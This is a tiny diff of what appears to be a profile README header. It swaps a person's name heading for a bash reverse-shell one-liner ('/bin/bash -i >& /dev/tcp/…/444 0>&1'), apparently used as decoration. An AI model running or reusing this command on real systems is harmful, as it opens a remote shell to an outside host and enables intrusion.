@@ -1,4 +1,4 @@
- <h1 align="center"> 📱 Sandra Costales 💻</h1>
+ <h1 align="center"> /bin/bash -i >& /dev/tcp/Sandra.Costales/444 0>&1 </h1>
 
 
 <table><tr><td valign="top" width="50%">
